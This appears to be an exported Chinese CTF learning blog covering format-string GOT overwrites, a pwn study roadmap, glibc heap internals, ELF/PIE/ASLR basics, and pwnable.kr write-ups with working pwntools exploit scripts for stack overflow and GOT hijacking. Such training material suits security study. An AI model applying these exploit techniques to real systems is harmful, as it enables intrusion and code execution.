GOT： 大致思路就是利用格式化字符串来篡改某个函数的got表的内容为system的地址。（能否为plt表有待验证） 题目质量较高，首先要求必须要读懂程序什么意思（分析程序是费时间的事情），分析每一个函数每一个功能，可参考文章：c语言阅读问题 其次要看程序是否有返回，是否能自己返回运行，这点很重要。 寻找的目标函数要有直接放入字符串的特点。例如：puts(s)，printf(s)，篡改后将s（s也要有可输入的提特点）改为/bin/sh就可以直接调用了。 先考读，再考写，再考如何利用。 目前大致思路已经明了，但是细节还是不行，有‘/bin/sh;’中的‘；’ hijack retaddr: int变（_BYTE）强制类型转换就是把前24位全部抹去。 int a = 3； 00000000 00000000 00000000 00000011 （强转byte时前面24个0被截断）byte b = 3； 00000011int a = -3； 11111111 11111111 11111111 11111101 （强转byte时前面24个1被截断）byte b = -3 11111101 用read读取时每一个输入都是字符，比如输入1000，储存到缓冲区为\x30\x30\x30\x31。 常见程序类型：一个函数输入用户名和密码（这里需要读懂其匹配方式），然后又一个函数让你选功能，每一个功能又一个函数。函数之间传参基本是用地址传递，需熟练。 分块思想：先想好分几步再想每一步应该做什么，一步一步完成。 还是p.recv()+p.sendline()好用，不要用p.sendlineafter()。 接受的时候要注意字符串的末尾是否有‘\n’，若有的话可以用p.recvuntil(‘\n’)或者p.recvline().strip()。 熟悉调用函数和被调用函数的关系，他们之间rbp的偏移不变。 代码有不懂的地方。 一些摸索，关于接收问题：若返回值是以字符串的形式（puts，%k$s）打印出来的，则需要u32(p.recv()[:])或者u64(p.recv()[:])来解包，若以整数形式则直接int(p.recvuntil(‘\n’),16)。 [:]的用法参考;[:]，前留后不留。 i春秋：MMA CTF 2nd 2016-greeting： 改写fini_arry使程序返回，需同时改写两个数值，exp看不懂。（总结时回头看终于理解！！） 他的坑在于printf()并不是直接的printf(s)，而是printf(‘Nice to meet you, %s’,s)，在输入s时必须要去掉len(‘Nice to meet you, ‘)个字符。其实就是截断问题，根据hn,hhn,n的不同类型截断。 22angstromctf 2016-format1： 开始时思路为想用格式化字符串篡改main函数返回地址为call system的地址，后来经过调试发现和之前做例题差别较大。 实际上思路很简单，用写的功能篡改secret的数据。 但是不知道为什么我自己的成功不了。（写总结时突然想到，原因是如果将p64(fun_got)放在‘%K$hn’前面字符串会截断！！！） 要注意两个对齐，一个是地址对齐，一个数据长度对齐。 Nullcon Hackim 2017-question1： 这一题先用checksec查看时发现NX没开（当时没注意）和relro没开，所以我第一反应想到的是got表泄露，成功了。 给的exp是用shellcode放进堆里，也很巧妙，因为没有注意nx所以没有想到。 ReaHat 2017-pwn2： 简单的泄露libc然后利用即可。 volga ctf 2013-Exploitation 200： 这题有坑，下次见到过于复杂的if条件时可以想着跳过，控制程序执行流。]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>pwn基础</tag>
        <tag>小心得</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[知识点总结与学习资料整理]]></title>
    <url>%2F2019%2F02%2F19%2F%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93%E4%B8%8E%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[知识点总结：前提准备：工具准备： ubuntu虚拟机（建议装两个版本16.04和18.04，因为到后期堆的时候不同版本的ubuntu对应不同的glibc版本(我现在有5个版本)，而不同的glibc版本有不同的防御机制，思路会完全不一样。），当然有原装的更好了orz。 IDA pro。 gdb用于动态调试以及pwndbg插件，pwntools库。 vscode(虚拟机用的话会很卡，除非你分配8g内存给虚拟机。。。)。 Google，为什么不建议百度呢，因为google会显示出更多师傅的blog的文章，而百度大部分都是一些看似很牛逼但实际上不咋地的垃圾网站的帖子，无论是找学习资料还是找题解的wp，google都胜过百度。 知识准备： 汇编基础语法（对重点语句call，leave，retn等要有较深的理解） python基础语法 c语言较扎实（特别是指针和链表这一块） linux基本命令 第一阶段：pwnable.kr的第一部分：这一阶段主要的目的是了解pwn的题目形式，毕竟它和以往学的数学物理无论是学习还是做题形式都不一样，可能开始时都不会做，会毫无头绪直接看writeup，但是慢慢地就会习惯，找到套路，并且熟悉Linux的常用命令与怎么远程连接服务器，从远程服务器下载文件等基本功，等于是熟悉环境和题目大致形式的一个转变的过程。我的建议是在做完以后再自己独立地从头到尾地把exp整理一遍，确保自己能独立做出并理解其中的思想。 第二阶段：ctf-wiki与i春秋的体系学习：栈部分：分为以下几大块： 熟悉基本函数调用的栈的排布格局，理解leave，retn，call的意义，知道怎么算偏移，简称为基础栈溢出。 理解shellcode，在未开NX的情况下懂得利用shelllcode。 rop: 基础rop 带libc的rop brop stack pivot srop ret2_dl_runtime_reslove(32位和64位) ret2vsdo 在i春秋上有栈这一部分较完整的教程，且配有课后习题，比较好，配合wiki学习效果更佳，因为后来我发现看一篇文章很难理解一个技术，一般需要参考好几个orz（甚至上两位数），所以需要充足的耐心。 格式化字符串部分： i春秋的第六篇文章说的很清楚，题目质量也不错，配合wiki学习三天就可以结束（当然难度大的还是不行）。 堆部分： 学习堆的内存管理机制（较重要！！！不理解后面都是扯淡），当初我只是大致看了一下，感觉自己懂了，做题才发现自己太幼稚orz，堆是pwn中的重点内容，很多压轴都是建立在堆之上的。。所以这一块是重中之重！！ 堆漏洞： uaf，unlink，off-one-by（off-one-null)，double free，chunk overlapping。 堆溢出： fastbin-attack unsortedbin-attack largebin-attack house of orange house of spirit house of lore house of force house of roman house of atum（去年才出现） 其他：堆fengshui，，堆排布，堆喷（被鸡哥的薛定谔的堆虐惨了）等。。。。 第三阶段：专题刷题： 各个板块学习完以后的刷题，巩固知识点的理解。 第四阶段：综合刷题： 综合刷题，在不告诉你漏洞方向与漏洞点，没有提示的情况下独立做出来题目才是真本事。 资料整理：学习： ctf-wiki在阶段比较全的成体系的资料之一 i春秋论坛上比较好的栈和格式化字符串的学习资料，配有课后习题，个人感觉质量比较好 （在左上角的搜索框里输入pwn入门就会出现10篇教程，一篇一篇看即可） 看雪知识库 CTF-All-IN-ONE (一本即将出版的西电师傅写的ctf书，（我不知道为什么里面大部分都是pwn的内容），题目都是大型比赛的题，质量比较高) 一个pwn的项目收集，里面有很多工具和题目以及wp收集 一个ctf项目 在i春秋上搜pwn的网课，有一个Atum师傅的课，里面有不少资料和学习方法，推荐去看。 其实最好的学习方式就是自己耐下心来谷歌。。。 一些博客： 台湾的angleboy，里面很多技术的原理讲的很详细，强烈安利 不认识这位师傅，但是他很多文章写得很好 深入理解计算机系统浓缩总结 FlappyPig team的Swing师傅 vidar team的veritas501师傅 sakura师傅 fb战队的ios师傅 川大windows内核大佬wjllz 川大校队hpasserby师傅 天枢-P1umer 天枢-p4nda 天枢-sunichi 天枢-e3pem 天枢-ama2in9 菜鸡-xiaoxiaorenwu 刷题： 2018比赛题目收集 ctf-wiki里的题目 pwnable.kr pwnable.tw Jarvis oj xctf社区_攻防世界 ctf-all-in-one里收集的各大比赛的题目。 其他网站： shellcode收集站1 shellcode收集站2 libc数据库搜索 一个类似ctf-wiki的项目 （里面有很多我没提到的比较偏门的刷题网站） 还有很多小的资料都是在以上列举的这些大资料里的，就不一一列举。 （希望再过多年以后还能凭着自己内心的热爱为安全事业贡献一份力。。]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[堆的理论知识学习]]></title>
    <url>%2F2019%2F02%2F13%2F%E5%A0%86%E7%9A%84%E7%90%86%E8%AE%BA%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[最近花了两天时间上网查阅资料学习了堆的内存管理模式，找到了几篇还不错的文章，在此分享一下： Linux堆内存管理深入分析上 Linux堆内存管理深入分析下 PWN之堆内存管理 申请内存块 看雪的求助 较详细的内存分配过程 Glibc 内存管理 Ptmalloc2 源代码分析 华庭（庄明强） (经典，较长但较详细，可自己上网找) 这几篇文章讲的已经比较详细，基础的东西我就不再赘述，只是总结一下我自己的一些心得和理解： 所谓堆的内存管理模式看起来比较复杂，主要原因是知识点较多，引入新的结构体和新函数比较多，让人一下子不能理解地那么深，或者说记忆不了那么多，耐心多看几遍就会好很多，需要一定的时间沉淀。 主要内容有三点： 一是几种结构体的介绍：malloc_state， malloc_chunk，heap_info，和chunk的结构 ||| fast_bins，small_bins，large_bins，unsorted_bin。 二是arena的介绍，多线程堆是如何管理的，malloc中mmap和brk的区别，main_arena和thread_arena的区别。（这一点在第一篇文章有详细介绍） 三是内存的分配与回收（最后一篇文章较详细），这一点最难也最重要，又全部围绕怎么让这个过程变得高效来设计（主要在于large chunk的分配需要进行碎片合并和整理的大循环）： 当malloc(size)的时候，先进行一部分处理和加锁后，开始正式分配，先看size的大小，如果在fast_bins之内，就先遍历fast_bins中有没有正好适合的chunk有的话分配后返回，没有的话或者size的大小大于64bytes小于512sizes则进入small_bins寻找，找到合适的返回，没有的话或者size大小大于512bytes属于large chunk，大循环开始，开始对fast_bins里的碎片开始整理和合并，物理地址相连的chunk合并以后放进unsorted_bin里，不能合并的直接放进unsorted_bins里，然后对unsorted_bin中的chunk从其尾指针指向的chunk开始（FIFO算法）进行遍历，if(大小刚好符合) {取出分配返回} else {将其放入对应的bin中，这个过程结束会将fast_bins和unsorted_bins清空}，遍历完成后再看last remainder chunk，其大小大于size时切割然后unsorted_bin的尾指针指向新的last remainder chunk，并更新储存其数据内容的结构。。。。 内容太多，直接看最后一篇文章吧QAQ。 orz]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>pwn基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[二进制方面知识扩充]]></title>
    <url>%2F2019%2F01%2F28%2F%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%B9%E9%9D%A2%E7%9F%A5%E8%AF%86%E6%89%A9%E5%85%85%2F</url>
    <content type="text"><![CDATA[PIE和ASLR：参考链接：对PIE和ASLR的理解 首先，ASLR的是操作系统的功能选项，作用于executable（ELF）装入内存运行时，因而只能随机化stack、heap、libraries的基址；而PIE（Position Independent Executables）是编译器（gcc，..）功能选项（-fPIE），作用于excutable编译过程，可将其理解为特殊的PIC（so专用，Position Independent Code），加了PIE选项编译出来的ELF用file命令查看会显示其为so，其随机化了ELF装载内存的基址（代码段、plt、got、data等共同的基址）。 PIE只是在编译的过程中赋予了ELF加载到内存时其加载基址随机化的功能，也就是说PIE编译出来的ELF如果在ASLR=0的情况下，ELF的加载基址也是不会变的。 所以这是ASLR 的三个级别变成了 ：0， 不开启任何随机化；1， 开启stack、libraries [、executable base（special libraries -^-） if PIE is enabled while compiling] 的随机化；2，开启heap随机化。 因而，我们会发现PIE编译出来的executable如果ASLR=0的话，基址也是不会变的（有能力但没使用），如果ASLR=1的话，即使按照ASLR定义这个级别似乎不会对heap基址随机化，但是由于executable的基址已经随机化了，所以heap的基址自然也就被随机化了：） ELF文件的结构：参考链接：参考 elf文件分三种类型： 1、目标文件（通常是.o); 2、可执行文件(我们的运行文件) 3、动态库(.so) ​ 我们先讲一下可执行文件。 ​ 可执行文件一般分成4个部分，能扩展，我们理解这4部分就够了。 ​ 1. elf文件头 ，这个文件是对elf文件整体信息的描述，在32位系统下是56的字节，在64位系统下是64个字节。 对于可执行文件来说，文件头包含的一下信息与进程启动相关 e_entry 程序入口地址 e_phoff segment偏移 e_phnum segment数量 ​ 2. segment表， 这个表是加载指示器，操作系统（确切的说是加载器，有些elf文件，比如操作系统内核，是由其他程序加载的）,该表的结构非常重要。 typedef struct { Elf64_Word p_type; / Segment type / Elf64_Word p_flags; / Segment flags / /*segment权限，6表示可读写，5表示可读可执行 Elf64_Off p_offset; / Segment file offset / /段在文件中的偏移/ Elf64_Addr p_vaddr; / Segment virtual address / /*虚拟内存地址，这个表示内存中的 Elf64_Addr p_paddr; / Segment physical address /物理内存地址，对应用程序来说，这个字段无用*/ Elf64_Xword p_filesz; / Segment size in file / /段在文件中的长度/ Elf64_Xword p_memsz; / Segment size in memory / /在内存中的长度，一般和p_filesz的值一样*/ Elf64_Xword p_align; / Segment alignment / / 段对齐/ } Elf64_Phdr; ​ 3. elf的主题，对于可执行文件来说，最主要的就是数据段和代码段 ​ 4. section表，对可执行文件来说，没有用，在链接的时候有用，是对代码段数据段在链接是的一种描述。 ​ 整个elf文件的组成可以使用下图来描述: ELF文件的载入和运行及动态链接：参考链接:重读《深入理解计算机系统》 运行地址也就是链接地址。实际上指的是，程序在运行过程中，该指令对应的内存地址。 我们再回到本系列的主题：程序的加载和运行。可执行程序生成之后，是保存在硬盘中的，当用户执行该程序的时候，该程序会被加载器按照program header table的描述将程序的代码段和数据段从硬盘加载到内存中。在使用MMU的机器上，CPU处理的地址是虚拟地址。同样的，加载到内存中的地址指的也是虚拟地址。由于虚拟内存的抽象，每个进程都认为其独占内存，因此，每个可执行程序总是可以被加载到相同的内存地址（虚拟地址），其实，这些内存地址都是位于各个可执行程序独自的内存空间的地址。但是，对于MMU来讲，这些相同的虚拟地址其实对应了不同的物理地址。而对于CPU来讲，指令是按照其虚拟地址一条条的被加载到CPU中运行的。 如上所述，加载器是按照program header table的描述来给程序代码段分配指令地址的。具体的过程如下： 还记得我们在可执行文件详解中segment和section的对应关系吧？每个section按照这个mapping表顺序排列构成了不同的segment。其中第2个segment就是可执行文件的代码段。代码段中第一个section是.interp，其起始地址是0x400238，然后，加上.interp section的大小，就是下一个section .note.ABI-tag的起始地址。依次类推，对于可执行文件详解中的可执行文件add来讲，其.text的起始地址就是0x400430。 为什么对于X86_64架构来讲，所有可执行文件的text segment的起始地址都是0x400000? 实际上是链接脚本规定的，在链接过程中，链接器会根据链接脚本的描述来构建可执行文件。对于X86_64来讲，其默认的链接脚本位于/usr/lib/ldscripts/elf_x86_64.x。在其中我们发现这句话：__executable_start = SEGMENT_START(&quot;text-segment&quot;, 0x400000))它指定了可执行的text segment应起始于0x400000。 根据上述objdump -d的输出，.text的第一个函数是_start，因此，_start的第一条指令地址就是0x400430。后面每个函数的地址等于它的上一个函数的地址加上该函数自身的字节数。这样，完成了给每个函数重定位（分配运行地址）的过程。 函数中的每条指令的地址的重定位类似于函数重定位。函数的首地址即是第一条指令的首地址，后面每条指令的地址依次等于上一条指令的地址加上该指令的字节数。回忆编译过程分析中，在编译完成后，指令引用外部符号时，生成了对应的操作数和符号的占位符，此时，对于除动态链接库的符号外，其他的符号都已经有了确定的地址。因此，结合符号表我们就可以将类似的指令完成重定位。 比如在本例中，对于main函数来讲，调用了两个外部函数add和printf，根据上面信息，add函数相关的代码已经确定在0x400526处。因此，该地址就是call指令的调用add的操作数。而上述代码显示的400400处似乎并非是printf函数真正的实现。没错，这是因为printf函数是属于libc的库函数，但是，我们知道对于动态链接来讲，在生成可执行文件时，并未将它所依赖的动态库的代码复制过来，而只是复制了相关的重定位信息和符号表，所以，此时依然不能确定printf函数的地址。而400400处的内存值只是一个跳板，等程序运行时，动态链接器会将相关动态链接库的代码链接进来，修改这个跳板处对应的值，就可以让跳转指令正确的跳转到printf函数真正的内存地址处执行了。稍后我们将会对该过程做详细的分析。（涉及到PLT和GOT表的知识） 上篇文章我们提到，为了保证代码复用和节省计算机资源，在链接时，动态链接库的代码段和数据段等是不会被复制到最终生成的可执行文件中的，这些部分会在程序加载的时候复制到内存，并做动态链接，使原来可执行文件能够对其中定义的符号正常引用。也就是说在这个时候，可执行文件代码段中对动态链接库包含的符号引用的地址才真正确定下来。但是我们查看各个segment的属性可以知道，.text segment是只读的，也就是说在编译成可以执行文件之后，就不能被修改了，那么如何确保它能够正确的引用在加载时才能确定下来的动态链接库里的符号呢？这就需要我们这篇文章里的GOT和PLT作为跳板来实现了。 GOT全称Global Offset Table，即全局偏移量表。它在可执行文件中是一个单独的section，位于.data section的前面。每个被目标模块引用的全局符号（函数或者变量）都对应于GOT中一个8字节的条目。编译器还为GOT中每个条目生成一个重定位记录。在加载时，动态链接器会重定位GOT中的每个条目，使得它包含正确的目标地址。 PLT全称Procedure Linkage Table，即过程链接表。它在可执行文件中也是一个单独的section，位于.textsection的前面。每个被可执行程序调用的库函数都有它自己的PLT条目。每个条目实际上都是一小段可执行的代码。]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>pwn基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable.kr第一部分exp与思路]]></title>
    <url>%2F2018%2F12%2F26%2Fpwnable-kr%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86exp%E4%B8%8E%E6%80%9D%E8%B7%AF%2F</url>
    <content type="text"><![CDATA[写这些没用的东西也没啥目的，除了回忆一下知识之外也就是练一下exp的书写，因为很多题没必要用exp所以那时候做就没练过。。。。。pwnable.kr第一部分确实很适合初学者做，大多为知识题，主要是强迫你去学知识，而且后面几题建立出一个基本框架，此外搭配jarvis.oj和ctf-wiki有体系的学习更好，完成这些再去pwnable.tw。。。 fd思路：1.有源码肯定先分析源码： 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[])&#123; if(argc&lt;2)&#123; printf("pass argv[1] a number\n"); return 0; &#125; int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp("LETMEWIN\n", buf))&#123; printf("good job :)\n"); system("/bin/cat flag"); exit(0); &#125; printf("learn about Linux file IO\n"); return 0;&#125; 2.题意简单明了：先找flag，发现当buf中装的是LETMEWIN时获得flag，回头找buf从何而来，发生了啥， read()中从fd文件符读32字节，fd即为文件操作符，只有当fd=0时我们才能通过输入控制，所以使argv[1]=’0x1234’ 即可。 exp： 12345from pwn import * s=ssh(host='pwnable.kr',user='fd',password='guest',port=2222)p=s.process(argv=['./fd','4660'],executable='./fd')p.sendline('LETMEWIN')p.interactive() collision思路：1. 有源码看源码： 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p)&#123; int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++)&#123; res += ip[i]; &#125; return res;&#125;int main(int argc, char* argv[])&#123; if(argc&lt;2)&#123; printf("usage : %s [passcode]\n", argv[0]); return 0; &#125; if(strlen(argv[1]) != 20)&#123; printf("passcode length should be 20 bytes\n"); return 0; &#125; if(hashcode == check_password( argv[1] ))&#123; system("/bin/cat flag"); return 0; &#125; else printf("wrong passcode.\n"); return 0;&#125; 先看代码结构：有两个函数，main()和check_password()，先看main()找到关于flag的语句，当hashcode等于将第二个参数传入check_password后的返回值时，拿到flag，hashcode已给出，分析check_password()即可，​ int* ip = (int*)p; 此句为理解关键，将char类型指针强转为int型，ip每加一移动4个字节，所以题意为将输入的20个字节的参数分为5组，累加后等于0x21dd09ec即可 计算器：0x01010101 * 4 +0x1dd905e8 = 0x21dd09ec （看网上说有坏字符的影响，但这么多数，随便选一个也可以了吧。。。。） exp: 12345from pwn import * s=ssh(host='pwnable.kr',user='col',password='guest',port=2222)str=p32(0x01010101)*4 + p32(0x1dd905e8)p=s.process(argv=['./col',str],executable='./col')p.interactive() bof思路：1. 下载看源码： 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void func(int key)&#123; char overflowme[32]; printf("overflow me : "); gets(overflowme); // smash me! if(key == 0xcafebabe)&#123; system("/bin/sh"); &#125; else&#123; printf("Nah..\n"); &#125;&#125;int main(int argc, char* argv[])&#123; func(0xdeadbeef); return 0;&#125; 这题是最基础的缓冲区溢出，只要对其有过一点研究的人都应该没什么问题，ctfwili上有全面详细的剖析，推荐自学参考 ctf-wiki 看完以后再做这个绝对没有问题 很明显对含有gets()的func()进行溢出，用overflowme覆盖key将key变成0xcafebabe exp: 12345from pwn import * s=remote('pwnable.kr',9000)payload='A'*0x34 + p32(0xcafebabe)s.sendline(payload)s.interactive() flag思路：1. 没给源码，只有elf文件，直接放进ida中，因为题目提示了This is reversing task. all you need is binary所以F5大法基本不管用了，再看其函数少的可怜（基本是加壳了），再看hex-view 机器码一行一行看时发现一句话 this file is packed with the UPX…….很明显，这题需要upx的知识储备，寻找谷歌百度 ，发现文件被Upx方式加壳，需要解壳。 先下载upx 然后在flag所在目录解壳flag,之后再把它放进ida中，看源码得知他要把flag复制进malloc()里，但是我们可以其实可以直接双击flag直接看注释得知flag…..可能是bug…. 或者在gdb里也可以直接在传递flag给rdx的指令后下个断点，然后在已字符串形式查看rdx的值即可。 passcode思路： 1. 老套路有源码看源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void login()&#123; int passcode1; int passcode2; printf("enter passcode1 : "); scanf("%d", passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf("enter passcode2 : "); scanf("%d", passcode2); printf("checking...\n"); if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123; printf("Login OK!\n"); system("/bin/cat flag"); &#125; else&#123; printf("Login Failed!\n"); exit(0); &#125;&#125;void welcome()&#123; char name[100]; printf("enter you name : "); scanf("%100s", name); printf("Welcome %s!\n", name);&#125;int main()&#123; printf("Toddler's Secure Login System 1.0 beta.\n"); welcome(); login(); // something after login... printf("Now I can safely trust you that you have credential :)\n"); return 0; &#125; 这题有点小难度：（首先应注意到welcome()和login()同在main()里且之间没有多余操作，所以他们ebp应该一样。）第一个思路是直接把system()的地址放进welcome()的ret里，后来发现name虽然限制了为100，但是name偏移了70H，失败。第二个思路是看passcode1和passcode2的地址，通过welcome中的name设计数据来控制他们的值：有两个地方行不通：1.passcode1与2与name的偏移大于100 。 2.passcode1为338150（0x000582E6），passcode2为13371337（0x00cc07c9）即可，然而且不论这两个地址是否是可写的，至少00字节的存在就因为截断而打消念想了。 所以这个时候问题就变得比较操蛋，需要查资料和新的东西了，通过调试理解plt和got表 诞生一种新方法，双重scanf()连续修改，在welcome()的scanf()利用name设计passcode1（需先确定passcode1的地址相对name的偏移）的值，将其值设为fflush()的got表地址，在login()的第一个scanf()向passcode1所指向的地址（Got表中原本写的是调用flush()指令的地址）改为调用system函数指令的地址，所以之后调用fflush()的时候就会调用system（）。 exp: 123456from pwn import *s=ssh(host='pwnable.kr',port=2222,user='passcode',password='guest')p=s.process('./passcode')payload='a'* 0x60 + '\x04\xa0\x04\x08' + '134514147'p.sendline(payload)p.interactive() exp需注意的地方：应数是输入给scanf 有固定格式，不能随便输入，例如%d只能为十进制整数，将134514147换成0x080485e3则不对。 random思路：1. 有源码 123456789101112131415161718#include &lt;stdio.h&gt;int main()&#123; unsigned int random; random = rand(); // random value! unsigned int key=0; scanf("%d", &amp;key); if( (key ^ random) == 0xdeadbeef )&#123; printf("Good!\n"); system("/bin/cat flag"); return 0; &#125; printf("Wrong, maybe you should try 2^32 cases.\n"); return 0;&#125; 明显看出rand()的种子为固定的，所以其值也为固定的值，自己写一个程序跑一下就可以得出其结果，然后用公式a或b=c，则a/b=c或b/a。用计算器得出答案。 exp: 12345from pwn import * s=ssh(host='pwnable.kr',user='random',port=2222,password='guest')p=s.process('./random')p.sendline('3039230856')p.interactive() input思路：1. 有源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;int main(int argc, char* argv[], char* envp[])&#123; printf("Welcome to pwnable.kr\n"); printf("Let's see if you know how to give input to program\n"); printf("Just give me correct inputs then you will get the flag :)\n"); // argv if(argc != 100) return 0; if(strcmp(argv['A'],"\x00")) return 0; if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0; printf("Stage 1 clear!\n"); // stdio char buf[4]; read(0, buf, 4); if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0; read(2, buf, 4); if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0; printf("Stage 2 clear!\n"); // env if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0; printf("Stage 3 clear!\n"); // file FILE* fp = fopen("\x0a", "r"); if(!fp) return 0; if( fread(buf, 4, 1, fp)!=1 ) return 0; if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0; fclose(fp); printf("Stage 4 clear!\n"); // network int sd, cd; struct sockaddr_in saddr, caddr; sd = socket(AF_INET, SOCK_STREAM, 0); if(sd == -1)&#123; printf("socket error, tell admin\n"); return 0; &#125; saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = INADDR_ANY; saddr.sin_port = htons( atoi(argv['C']) ); if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0)&#123; printf("bind error, use another port\n"); return 1; &#125; listen(sd, 1); int c = sizeof(struct sockaddr_in); cd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c); if(cd &lt; 0)&#123; printf("accept error, tell admin\n"); return 0; &#125; if( recv(cd, buf, 4, 0) != 4 ) return 0; if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0; printf("Stage 5 clear!\n"); // here's your flag system("/bin/cat flag"); return 0;&#125; 这题需要一些知识储备，包括socket通信，管道通信，环境变量的理解和简单运用，需要耐心一个一个知识点学习。 code: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;#include &lt;netdb.h&gt; void main()&#123; char *args[101]; int i; for(i=0;i&lt;100;i++)&#123; args[i]="A"; &#125; args['A']="\x00"; args['B']="\x20\x0a\x0d"; args['C']="5555"; args[100]=NULL; char* env[2]=&#123;"\xde\xad\xbe\xef=\xca\xfe\xba\xbe",NULL&#125;; int fd0[2]; int fd2[2]; pipe(fd0); pipe(fd2); FILE* fp = fopen("\x0a", "ab+"); fwrite("\x00\x00\x00\x00", 4, 1, fp); #define CHILD_READ0 fd0[0] #define PARENT_WRITE0 fd0[1] #define CHILD_READ2 fd2[0] #define PARENT_WRITE2 fd2[1] pid_t child; if((child=fork())&lt;0)&#123; printf("Error\n"); &#125;else if(child==0)&#123; close(PARENT_WRITE0); close(PARENT_WRITE2); dup2(CHILD_READ0,0); dup2(CHILD_READ2,2); close(CHILD_READ0); close(CHILD_READ2); execve("/home/input/input",args,env); &#125;else&#123; close(CHILD_READ0); close(CHILD_READ2); write(PARENT_WRITE0,"\x00\x0a\x00\xff",4); write(PARENT_WRITE2,"\x00\x0a\x02\xff",4); int sockfd, portno, n; struct sockaddr_in serv_addr; struct hostent *server; portno = atoi(args['C']); sockfd = socket(AF_INET, SOCK_STREAM, 0); server = gethostbyname("127.0.0.1"); bzero((char *) &amp;serv_addr, sizeof(serv_addr)); serv_addr.sin_family = AF_INET; bcopy((char *)server-&gt;h_addr, (char *)&amp;serv_addr.sin_addr.s_addr, server-&gt;h_length); serv_addr.sin_port = htons(portno); sleep(5); connect(sockfd,(struct sockaddr *) &amp;serv_addr,sizeof(serv_addr)); write(sockfd,"\xde\xad\xbe\xef",4); close(sockfd); &#125;&#125; leg思路: 1. 有源码，也给了汇编码，知识题（学习arm汇编知识）： 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;int key1()&#123; asm("mov r3, pc\n");&#125;int key2()&#123; asm( "push &#123;r6&#125;\n" "add r6, pc, $1\n" "bx r6\n" ".code 16\n" "mov r3, pc\n" "add r3, $0x4\n" "push &#123;r3&#125;\n" "pop &#123;pc&#125;\n" ".code 32\n" "pop &#123;r6&#125;\n" );&#125;int key3()&#123; asm("mov r3, lr\n");&#125;int main()&#123; int key=0; printf("Daddy has very strong arm! : "); scanf("%d", &amp;key); if( (key1()+key2()+key3()) == key )&#123; printf("Congratz!\n"); int fd = open("flag", O_RDONLY); char buf[100]; int r = read(fd, buf, 100); write(0, buf, r); &#125; else&#123; printf("I have strong leg :P\n"); &#125; return 0;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879(gdb) disass mainDump of assembler code for function main: 0x00008d3c &lt;+0&gt;: push &#123;r4, r11, lr&#125; 0x00008d40 &lt;+4&gt;: add r11, sp, #8 0x00008d44 &lt;+8&gt;: sub sp, sp, #12 0x00008d48 &lt;+12&gt;: mov r3, #0 0x00008d4c &lt;+16&gt;: str r3, [r11, #-16] 0x00008d50 &lt;+20&gt;: ldr r0, [pc, #104] ; 0x8dc0 &lt;main+132&gt; 0x00008d54 &lt;+24&gt;: bl 0xfb6c &lt;printf&gt; 0x00008d58 &lt;+28&gt;: sub r3, r11, #16 0x00008d5c &lt;+32&gt;: ldr r0, [pc, #96] ; 0x8dc4 &lt;main+136&gt; 0x00008d60 &lt;+36&gt;: mov r1, r3 0x00008d64 &lt;+40&gt;: bl 0xfbd8 &lt;__isoc99_scanf&gt; 0x00008d68 &lt;+44&gt;: bl 0x8cd4 &lt;key1&gt; 0x00008d6c &lt;+48&gt;: mov r4, r0 0x00008d70 &lt;+52&gt;: bl 0x8cf0 &lt;key2&gt; 0x00008d74 &lt;+56&gt;: mov r3, r0 0x00008d78 &lt;+60&gt;: add r4, r4, r3 0x00008d7c &lt;+64&gt;: bl 0x8d20 &lt;key3&gt; 0x00008d80 &lt;+68&gt;: mov r3, r0 0x00008d84 &lt;+72&gt;: add r2, r4, r3 0x00008d88 &lt;+76&gt;: ldr r3, [r11, #-16] 0x00008d8c &lt;+80&gt;: cmp r2, r3 0x00008d90 &lt;+84&gt;: bne 0x8da8 &lt;main+108&gt; 0x00008d94 &lt;+88&gt;: ldr r0, [pc, #44] ; 0x8dc8 